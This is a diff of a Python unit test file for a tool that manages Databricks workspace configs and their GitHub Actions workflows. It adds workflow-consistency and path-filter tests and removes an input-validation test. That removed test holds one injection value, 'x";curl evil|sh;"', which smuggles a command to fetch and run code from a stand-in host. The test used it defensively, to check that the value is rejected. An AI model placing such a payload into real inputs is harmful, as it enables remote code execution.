@@ -22,7 +22,7 @@ class Fleet(unittest.TestCase):
         host = host or f"https://adb-{abs(hash(name)) % 10**6}.1.azuredatabricks.net"
         id_ = id_ or str(abs(hash(name + "id")) % 10**9)
         (d / "workspace.yaml").write_text(
-            f"bu: {bu}          # business unit\nlob: X\naccount_id: \"{account}\"\nhost: {host}   # url\nid: {id_}\nci: true\n"
+            f"bu: {bu}          # business unit\nlob: X\naccount_id: \"{account}\"\nhost: {host}   # url\nid: {id_}\n"
 )
         if catalog:
             (d / "catalog.yaml").write_text(f"default_catalog: null\ncatalog:\n  name: {catalog}   # metastore-wide\n  schemas:\n    a:\n      comment: x\n")
@@ -99,33 +99,54 @@ class Fleet(unittest.TestCase):
         finally:
             ws.WORKSPACES = orig
 
-    def test_names(self):
-        self.assertEqual(ws.names(["a", "b"], self.root), ["a", "b"])
-        with self.assertRaises(SystemExit):
-            ws.names(['x";curl evil|sh;"'], self.root)
-    def test_config_and_dev_folders(self):
-        # dev/workspaces/ holds the workspaces that test the framework; names are unique across both.
+    def repo(self):
+        """A repository in self.root: config/ and dev/ workspace folders and .github/workflows/."""
         config, dev = self.root / "config/workspaces", self.root / "dev/workspaces"
         config.mkdir(parents=True), dev.mkdir(parents=True)
-        orig = (ws.WORKSPACES, ws.DEV_WORKSPACES)
-        ws.WORKSPACES, ws.DEV_WORKSPACES = config, dev
-        try:
-            for root, name, bu in ((config, "org-ws", "o"), (dev, "dev-ws", "d")):
-                (root / name).mkdir()
-                (root / name / "workspace.yaml").write_text(f"bu: {bu}\nhost: https://{name}\nid: {bu}1\n")
-            self.assertEqual(ws.ws_dir("dev-ws"), dev / "dev-ws")
-            self.assertEqual(ws.field("org-ws", "host"), "https://org-ws")
-            self.assertEqual(ws.names(["org-ws", "dev-ws"]), ["org-ws", "dev-ws"])
-            with self.assertRaises(SystemExit):
-                ws.names(["not-there"])
-            self.assertEqual(ws.check()[1], [])
-            (dev / "org-ws").mkdir()
-            (dev / "org-ws" / "workspace.yaml").write_text("bu: z\nhost: https://other\nid: z1\n")
-            self.assertEqual(ws.check()[1], ["org-ws is in both config/workspaces/ and dev/workspaces/: keep one"])
-            with self.assertRaises(SystemExit):
-                ws.ws_dir("org-ws")
-        finally:
-            ws.WORKSPACES, ws.DEV_WORKSPACES = orig
+        saved = (ws.ROOT, ws.WORKSPACES, ws.DEV_WORKSPACES, ws.WORKFLOWS)
+        ws.ROOT, ws.WORKSPACES, ws.DEV_WORKSPACES, ws.WORKFLOWS = self.root, config, dev, self.root / ".github/workflows"
+        self.addCleanup(lambda: setattr(ws, "ROOT", saved[0]) or setattr(ws, "WORKSPACES", saved[1])
+                        or setattr(ws, "DEV_WORKSPACES", saved[2]) or setattr(ws, "WORKFLOWS", saved[3]))
+        return config, dev
+
+    def test_config_and_dev_folders(self):
+        # dev/workspaces/ holds the workspaces that test the framework; names are unique across both.
+        config, dev = self.repo()
+        for root, name, bu in ((config, "org-ws", "o"), (dev, "dev-ws", "d")):
+            (root / name).mkdir()
+            (root / name / "workspace.yaml").write_text(f"bu: {bu}\nhost: https://{name}\nid: {bu}1\n")
+            ws.write_workflow(root / name)
+        self.assertEqual(ws.ws_dir("dev-ws"), dev / "dev-ws")
+        self.assertEqual(ws.field("org-ws", "host"), "https://org-ws")
+        self.assertEqual(ws.check()[1], [])
+        (dev / "org-ws").mkdir()
+        (dev / "org-ws" / "workspace.yaml").write_text("bu: z\nhost: https://other\nid: z1\n")
+        self.assertIn("org-ws is in both config/workspaces/ and dev/workspaces/: keep one", ws.check()[1])
+        with self.assertRaises(SystemExit):
+            ws.ws_dir("org-ws")
+
+    def test_each_workspace_has_its_workflow(self):
+        config, _ = self.repo()
+        (config / "fin").mkdir()
+        (config / "fin" / "workspace.yaml").write_text("bu: fin\nhost: https://adb-1.1.azuredatabricks.net\nid: 1\n")
+        self.assertEqual(ws.check()[1], ["fin has no workflow: run python3 scripts/workspaces.py workflows"])
+        wf = ws.write_workflow(config / "fin")
+        self.assertEqual(ws.check()[1], [])
+        wf.write_text(wf.read_text().replace("cron", "# cron"))
+        self.assertIn("differs from the template", ws.check()[1][0])
+        ws.write_workflow(config / "fin")
+        (ws.WORKFLOWS / "workspace-gone.yml").write_text("x")
+        self.assertEqual(ws.check()[1], [".github/workflows/workspace-gone.yml has no workspace folder: delete it, or restore the folder"])
+
+    def test_a_workflow_runs_for_its_folder_and_for_the_defaults(self):
+        text = ws.workflow_text("fin", "config/workspaces/fin")
+        pr, push = text.split("  push:")[0], text.split("  push:")[1].split("  schedule:")[0]
+        for paths in (pr, push):
+            for p in ('"config/workspaces/fin/**"', '"config/defaults/**"', '"terraform/**"', '"!terraform/tests/**"'):
+                self.assertIn(p, paths)
+        self.assertNotIn("config/setup.yaml", push, "a change to the AI review settings plans, never applies")
+        self.assertIn("uses: ./.github/workflows/workspace.yml\n    with:\n      workspace: fin", text)
+        self.assertLess(text.index('"terraform/**"'), text.index('"!terraform/tests/**"'), "a negated path must follow the path it narrows")
 
     def test_the_repository_passes(self):
         self.assertEqual(ws.check()[1], [])
